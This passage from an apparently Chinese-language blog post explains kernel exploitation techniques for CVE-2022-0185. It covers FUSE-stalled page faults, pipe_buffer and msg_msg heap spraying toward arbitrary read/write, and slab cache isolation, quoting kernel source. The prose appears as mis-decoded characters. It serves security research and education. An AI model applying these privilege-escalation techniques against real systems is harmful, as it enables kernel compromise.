fuse_file_info *);</span><br><span class="line"><span class="keyword">void</span> *(*init) (struct fuse_conn_info *conn,</span><br><span class="line">       struct fuse_config *cfg);</span><br><span class="line"><span class="keyword">void</span> (*destroy) (<span class="keyword">void</span> *private_data);</span><br><span class="line"><span class="keyword">int</span> (*access) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*create) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*lock) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *, <span class="keyword">int</span> cmd,</span><br><span class="line">     struct flock *);</span><br><span class="line"> <span class="keyword">int</span> (*utimens) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> struct timespec tv[<span class="number">2</span>],</span><br><span class="line"> struct fuse_file_info *fi);</span><br><span class="line"><span class="keyword">int</span> (*bmap) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span> blocksize, <span class="keyword">uint64_t</span> *idx);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> FUSE_USE_VERSION &lt; 35</span></span><br><span class="line"><span class="keyword">int</span> (*ioctl) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span> cmd, <span class="keyword">void</span> *arg,</span><br><span class="line">      struct fuse_file_info *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">void</span> *data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">int</span> (*ioctl) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">void</span> *arg,</span><br><span class="line">      struct fuse_file_info *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">void</span> *data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> (*poll) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *,</span><br><span class="line">     struct fuse_pollhandle *ph, <span class="keyword">unsigned</span> *reventsp);</span><br><span class="line"><span class="keyword">int</span> (*write_buf) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_bufvec *buf, <span class="keyword">off_t</span> off,</span><br><span class="line">  struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*read_buf) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_bufvec **bufp,</span><br><span class="line"> <span class="keyword">size_t</span> size, <span class="keyword">off_t</span> off, struct fuse_file_info *);</span><br><span class="line"><span class="keyword">int</span> (*flock) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *, <span class="keyword">int</span> op);</span><br><span class="line"><span class="keyword">int</span> (*fallocate) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">off_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">  struct fuse_file_info *);</span><br><span class="line"><span class="keyword">ssize_t</span> (*copy_file_range) (<span class="keyword">const</span> <span class="keyword">char</span> *path_in,</span><br><span class="line">    struct fuse_file_info *fi_in,</span><br><span class="line">    <span class="keyword">off_t</span> offset_in, <span class="keyword">const</span> <span class="keyword">char</span> *path_out,</span><br><span class="line">    struct fuse_file_info *fi_out,</span><br><span class="line">    <span class="keyword">off_t</span> offset_out, <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags);</span><br><span class="line"><span class="keyword">off_t</span> (*lseek) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">off_t</span> off, <span class="keyword">int</span> whence, struct fuse_file_info *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨æ—¶éœ€è¦å…ˆå®ç°ä¸Šé¢å‡½æ•°è¡¨ä¸­çš„å‡½æ•°æ¥å£ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„ç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œå…¶å®éƒ½æ˜¯é€šè¿‡å¯¹è¯¥å‡½æ•°è¡¨ä¸­å®šä¹‰çš„å‡½æ•°å›è°ƒå®ç°çš„ã€‚</p><p>ä¸éš¾æƒ³åˆ°ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿï¼Œä¸ºè¯»å†™ç­‰æ¥å£æ³¨å†Œå›è°ƒå‡½æ•°ï¼Œä½¿ç”¨ mmap å°†è¯¥æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œå½“è¿›ç¨‹åœ¨å†…æ ¸ä¸­è¯»å†™è¿™å— mmap å†…å­˜æ—¶ï¼Œä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ­¤æ—¶æ§åˆ¶æƒä¾¿ä¼šè½¬äº¤åˆ°æˆ‘ä»¬æ³¨å†Œçš„å›è°ƒå‡½æ•°å½“ä¸­ï¼Œç„¶è€Œåœ¨å›è°ƒå‡½æ•°ä¸­çš„æ“ä½œæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥æ•ˆæœå°±å¾ˆç±»ä¼¼äº<code>userfaultfd</code>äº†ã€‚</p><p>ä¸è¿‡å¸¸è§„çš„ libfuse åº“å¹¶ä¸æ”¯æŒé™æ€ç¼–è¯‘ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æ— æ³•åƒä»¥å¾€ä¸€æ ·å…ˆé™æ€ç¼–è¯‘ä¸€ä¸ª exp å†ä¼ åˆ°è¿œç¨‹ï¼Œä¸è¿‡åœ¨æ­¤CVEçš„githubä»“åº“ä¸­å­˜åœ¨å…¶é™æ€ç¼–è¯‘çš„æ“ä½œã€‚<a class="link"   href="https://github.com/Crusaders-of-Rust/CVE-2022-0185" >https://github.com/Crusaders-of-Rust/CVE-2022-0185<i class="fas fa-external-link-alt"></i></a></p><h3 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h3><p>è¿™é‡Œæœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼Œé¦–å…ˆå°±æ˜¯æˆ‘ä»¬åœ¨ <a class="link"   href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >å‘pipe_bufferè¯´yesï¼<i class="fas fa-external-link-alt"></i></a> æ–‡ç« ä¸­æåˆ°çš„ä½¿ç”¨<code>pipe_buffer</code>æ„é€ å‡ºé¡µçº§çš„UAFï¼Œæœ€ç»ˆå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹åœ¨è¿™ä¸ªæ¼æ´ä¸­å¦‚ä½•ä½¿ç”¨å°±è¡Œï¼Œä¸è¿‡å¤šåœç•™äº† <del>ç»å¯¹ä¸æ˜¯å› ä¸ºæˆ‘æ˜¯æ‡’ç‹—ä¸æƒ³å†™exp</del> ï¼Œè¿™ç¯‡æ–‡ç« é‡ç‚¹è¿˜æ˜¯çœ‹<code>FUSE</code>çš„ç”¨æ³•ï¼Œæ‰€ä»¥å…·ä½“è¿˜æ˜¯åœ¨å¦ä¸€ç§åˆ©ç”¨æ‰‹æ³•ã€‚</p><p>é¦–å…ˆï¼Œåœ¨å¼€å§‹<code>size = 4095</code>æ—¶å³ä¾¿æ˜¯ä¼ å…¥çš„<code>key</code>ä¸º<code>\x00</code>æ—¶ä¹Ÿä¼šåœ¨ä¸‹ä¸€ä¸ª<code>object</code>ä¸­å†™å…¥ä¸€ä¸ª<code>&quot;=&quot;</code>ï¼Œæ‰€ä»¥ä¸å¹¸çš„æ˜¯ä¸èƒ½ç›´æ¥ä¿®æ”¹ä¸‹ä¸€ä¸ªç´§é‚»çš„<code>pipe_buffer-&gt;page</code>ã€‚å‰é¢ä¹Ÿæåˆ°äº†è¿™é‡Œé€‰æ‹©çš„æ–¹å¼ä¿®æ”¹ä¸‹ä¸€ä¸ª<code>object</code>ç´§é‚»çš„ä¸‹ä¸€ä¸ª<code>object</code>ï¼Œä¸è¿‡æˆ‘ä»¬å¦‚æœå•çº¯ä½¿ç”¨<code>pipe_buffer</code>è¿›è¡Œå †å–·æ—¶ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨åç»­å¯»æ‰¾è¢«è¦†ç›–<code>page</code>æŒ‡é’ˆçš„<code>pipe_buffer</code>çš„<code>idx</code>æ—¶ä¼šå‡ºç°ä¸€ä¸ªå¤§é—®é¢˜ï¼Œé‚£å°±æ˜¯å› ä¸ºå‰é¢ä¿®æ”¹å¯¼è‡´è¯»å–<code>pipe</code>æ—¶å¯¼è‡´<code>kernel panic</code>ã€‚æ‰€ä»¥a3é€‰æ‹©çš„åŠæ³•æ˜¯ä½¿ç”¨<code>msg_msg</code>è¿›è¡Œå¤§é‡å †å–·ï¼Œé€šè¿‡ä¿®æ”¹<code>m_ts</code>æ¥åˆ¤æ–­å“ªä¸ª<code>msg_msg</code>æ˜¯è¢«è¦†ç›–æ‰äº†ï¼Œä¹‹åè¿™ä¸ª<code>msg_msg</code>å°±ä¸å†ä½¿ç”¨é˜²æ­¢å‡ºç°<code>kernel panic</code>ï¼Œé‚£æ­¤æ—¶ä¹Ÿå°±æˆåŠŸå°†æ¼æ´è½¬åŒ–æˆäº†<code>off by null</code>äº†ï¼Œåç»­çš„ä½¿ç”¨å…¶å®å°±å’Œä¸Šé¢çš„æ–‡ç« ä¸­ä¸€è‡´äº†ï¼Œä¸ç†Ÿæ‚‰çš„æœ‹å‹å¯ä»¥å»çœ‹çœ‹ã€‚</p><p>å½“ç„¶è¿™é‡Œè¿˜éœ€è¦è€ƒè™‘çš„å°±æ˜¯<code>order</code>äº†ï¼Œæ­¤å¤„ç”³è¯·çš„<code>object</code>å¯¹åº”çš„<code>order</code>ä¸º3ã€‚å½“ç„¶ï¼Œå„ä½çŸ¥é“çŸ¥é“çš„<code>pipe</code>æä¾›<code>fcntl(F_SETPIPE_SZ)</code>è°ƒç”¨å¯ä»¥å»ä¿®æ”¹<code>pipe_buffer</code>çš„æ•°é‡ï¼Œæ‰€ä»¥å¯ä»¥è¾¾åˆ°å¯¹åº”çš„<code>order</code>å½“ç„¶<code>msg_msg</code>åŒç†ã€‚</p><h3 id="å†…éƒ¨éš”ç¦»åˆ†æ"><a href="#å†…éƒ¨éš”ç¦»åˆ†æ" class="headerlink" title="å†…éƒ¨éš”ç¦»åˆ†æ"></a>å†…éƒ¨éš”ç¦»åˆ†æ</h3><p>åœ¨çœ‹å®Œç¬¬ä¸€ç§åˆ©ç”¨æ–¹å¼çš„æœ‹å‹ä»¬å¯èƒ½ä¼šæœ‰ç‚¹ç–‘æƒ‘ï¼Œâ€ä¸ºä»€ä¹ˆå¯ä»¥ä½¿ç”¨<code>msg_msg</code>ï¼Ÿâ€ã€‚åœ¨ctf-wikiä¸­å†™äº†â€åœ¨linux kernel 5.9ä¹‹å‰å’Œlinux kernel 5.11ä¹‹åéƒ½æ˜¯å­˜åœ¨å †å—éš”ç¦»çš„â€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">kmalloc_cache_type</span> &#123;</span></span><br><span class="line">KMALLOC_NORMAL = <span class="number">0</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">KMALLOC_DMA = KMALLOC_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line">KMALLOC_CGROUP = KMALLOC_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">KMALLOC_CGROUP,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">KMALLOC_RECLAIM,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">KMALLOC_DMA,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">NR_KMALLOC_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨kernel 5.14ä¹‹åå­˜åœ¨å¦‚ä¸Šçš„<code>cache type</code>ï¼Œå…¶ä¸­å¸¸è¢«è®¤ä¸ºéš”ç¦»çš„æ˜¯<code>KMALLOC_CGROUPT</code>å…¶å¯¹åº”çš„æ˜¯flagä¸º<code>GFP_KERNEL_ACCOUNT</code>çš„ç”³è¯·ï¼Œå¯ä»¥åœ¨<code>slabinfo</code>æ–‡ä»¶ä¸­çœ‹åˆ°å…¶cacheçš„åå­—ä¸º<code>kmalloc-cg-*</code>ã€‚è€Œ<code>GFP_KERNEL</code>åˆ™å¯¹åº”çš„å°±æ˜¯<code>KMALLOC_NORMAL</code>ç±»å‹ï¼Œåœ¨<code>slabinfo</code>ä¸­å°±æ˜¯æ™®é€šçš„<code>kmalloc-*</code>ã€‚</p><p><strong>ä¸‹é¢ç®€å•ä»‹ç»ä¸€ä¸‹å†…å­˜éš”ç¦»çš„åŸç†ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line"><span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!index)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">flags, size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å†…æ ¸<code>kmalloc</code>çš„å®ç°é‡Œé¢å¯ä»¥çœ‹åˆ°çš„æ˜¯ï¼Œä¼šç»™<code>kmem_cache_alloc_trace</code>ä¼ å…¥ä¸€ä¸ªcacheï¼Œå¦å¤–<code>kmalloc_caches</code>æ˜¯ä¸€ä¸ªäºŒé‡æ•°ç»„ï¼Œé¦–å…ˆæ˜¯æ ¹æ®å¯¹åº”çš„<code>type</code>ç„¶åæ ¹æ®<code>size</code>ç¡®å®šä¸åŒçš„<code>index</code>å–å‡ºæœ€ç»ˆçš„<code>cache</code>ã€‚</p><p>è¿™é‡Œé‡ç‚¹çœ‹ä¸€ä¸‹<code>kmalloc_type</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_NOT_NORMAL_BITS\</span></span><br><span class="line"><span class="meta">(__GFP_RECLAIMABLE |\</span></span><br><span class="line"><span class="meta">(IS_ENABLED(CONFIG_ZONE_DMA)   ? __GFP_DMA : 0) |\</span></span><br><span class="line"><span class="meta">(IS_ENABLED(CONFIG_MEMCG_KMEM) ? __GFP_ACCOUNT : 0))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">enum</span> kmalloc_cache_type <span class="title">kmalloc_type</span><span class="params">(<span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The most common case is KMALLOC_NORMAL, so test for it</span></span><br><span class="line"><span class="comment"> * with a single branch for all the relevant flags.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> KMALLOC_NORMAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * At least one of the flags has to be set. Their priorities in</span></span><br><span class="line"><span class="comment"> * decreasing order are:</span></span><br><span class="line"><span class="comment"> *  1) __GFP_DMA</span></span><br><span class="line"><span class="comment"> *  2) __GFP_RECLAIMABLE</span></span><br><span class="line"><span class="comment"> *  3) __GFP_ACCOUNT</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))</span><br><span class="line"><span class="keyword">return</span> KMALLOC_DMA;</span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))</span><br><span class="line"><span class="keyword">return</span> KMALLOC_RECLAIM;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> KMALLOC_CGROUP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦çœ‹ä¸€ä¸‹<code>KMALLOC_NOT_NORMAL_BITS</code>çš„å®šä¹‰ï¼Œå› ä¸ºkernelé»˜è®¤å­˜åœ¨<code>CONFIG_MEMCG_KMEM</code>é€‰é¡¹æ‰€ä»¥æ·»åŠ äº†<code>__GFP_ACCOUNT</code>æ ‡è¯†ä¸ºï¼Œä»¥è‡³äºflagä¸º<code>GFP_KERNEL_ACCOUNT</code>æ—¶ä¸ä¼šç›´æ¥è¿”å›<code>KMALLOC_NORMAL</code>äº†ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†å †å—éš”ç¦»ã€‚</p><p>æ ¹æ®ä¸Šé¢çš„åˆ†æä¼šå‘ç°åœ¨<code>linux kernel 5.9</code>ä¹‹å‰ç¡®å®æ²¡æœ‰<code>KMALLOC_CGROUP</code>è¿™æ ·ä¸€ä¸ªæ–°å»ºçš„<code>kmem_cache</code>ï¼Œä¸è¿‡å…¶å®åœ¨æ­¤ä¹‹å‰ä¾æ—§æ˜¯å­˜åœ¨éš”ç¦»çš„ï¼Œè¿™é‡Œåˆ†æä¸€ä¸‹åœ¨<code>linux kernel 5.9</code>ä¹‹å‰çš„éš”ç¦»å®ç°åŸç†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line"><span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line"><span class="keyword">slab_flags_t</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset;<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> allocflags;<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line"><span class="keyword">int</span> refcount;<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line"><span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;<span class="comment">/* Offset to metadata */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> align;<span class="comment">/* Alignment */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;<span class="comment">/* Left redzone padding size */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *name;<span class="comment">/* Name (only for display!) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span><span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span><span class="comment">/* For sysfs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line"><span class="comment">/* For propagation, maximum size of a stored attr */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;<span class="comment">/* Usercopy region offset */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨ä¹‹å‰çš„<code>kmem_cache</code>ç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸Šï¼Œå¯ä»¥çœ‹åˆ°çš„æ˜¯å†…éƒ¨ä¼šæ ¹æ®æ˜¯å¦å¼€å¯äº†<code>MEMCG</code>è¿™ä¸ªé€‰é¡¹æ¥æ·»åŠ <code>struct memcg_cache_params memcg_params;</code>è¿™æ ·ä¸€ä¸ªé¢å¤–çš„ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">root_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> __<span class="title">rcu</span> *<span class="title">memcg_caches</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> __<span class="title">root_caches_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children</span>;</span></span><br><span class="line"><span class="keyword">bool</span> dying;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span 